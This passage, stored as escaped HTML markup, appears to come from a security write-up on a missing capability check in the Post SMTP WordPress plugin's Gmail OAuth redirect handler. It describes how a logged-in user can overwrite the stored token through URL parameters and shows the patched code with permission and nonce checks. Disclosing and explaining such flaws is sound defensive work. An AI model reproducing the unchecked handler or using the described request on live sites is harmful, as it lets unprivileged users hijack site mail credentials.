class=&#34;c1&#34;&gt;//&amp;ensp;Save&amp;ensp;the&amp;ensp;OAuth&amp;ensp;parameters&amp;ensp;to&amp;ensp;the&amp;ensp;WordPress&amp;ensp;options&amp;ensp;table.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;postman_auth_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$oauth_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The logic of &lt;code&gt;handle_gmail_oauth_redirect&lt;/code&gt; shows how the Post SMTP plugin processes &lt;strong&gt;OAuth tokens&lt;/strong&gt; from Gmail. However, there are critical weaknesses:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;A logged-in user only needs to access an admin page with the parameters &lt;code&gt;action=gmail_oauth_redirect&lt;/code&gt; and &lt;code&gt;access_token&lt;/code&gt; in the URL to trigger the update logic.&lt;/li&gt;&#xA;&lt;li&gt;There is &lt;strong&gt;no capability check&lt;/strong&gt; to ensure that only administrators are allowed to perform this action.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v3.6.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;handle_gmail_oauth_redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;if&amp;ensp;the&amp;ensp;required&amp;ensp;OAuth&amp;ensp;parameters&amp;ensp;are&amp;ensp;present&amp;ensp;in&amp;ensp;the&amp;ensp;URL.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gmail_oauth_redirect&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Capability&amp;ensp;check:&amp;ensp;Only&amp;ensp;allow&amp;ensp;administrators&amp;ensp;to&amp;ensp;update&amp;ensp;OAuth&amp;ensp;tokens&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;You&amp;ensp;do&amp;ensp;not&amp;ensp;have&amp;ensp;sufficient&amp;ensp;permissions&amp;ensp;to&amp;ensp;access&amp;ensp;this&amp;ensp;page.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;post-smtp&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;CSRF&amp;ensp;protection:&amp;ensp;Verify&amp;ensp;nonce&amp;ensp;(required&amp;ensp;by&amp;ensp;security&amp;ensp;report)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_wpnonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_wpnonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Security&amp;ensp;check&amp;ensp;failed.&amp;ensp;Nonce&amp;ensp;is&amp;ensp;missing.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;post-smtp&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Verify&amp;ensp;the&amp;ensp;nonce&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_wpnonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gmail_oauth_redirect&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Security&amp;ensp;check&amp;ensp;failed.&amp;ensp;Invalid&amp;ensp;nonce.&amp;ensp;Please&amp;ensp;try&amp;ensp;again.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;post-smtp&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Sanitize&amp;ensp;and&amp;ensp;retrieve&amp;ensp;URL&amp;ensp;parameters&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$access_token&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;access_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;access_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refresh_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refresh_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refresh_token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires_in&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;expires_in&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;expires_in&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$user_email&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_email&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user_email&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$auth_token_expires&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires_in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$access_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$oauth_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;access_token&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$access_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refresh_token&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refresh_token&lt;/span&gt;&lt;span 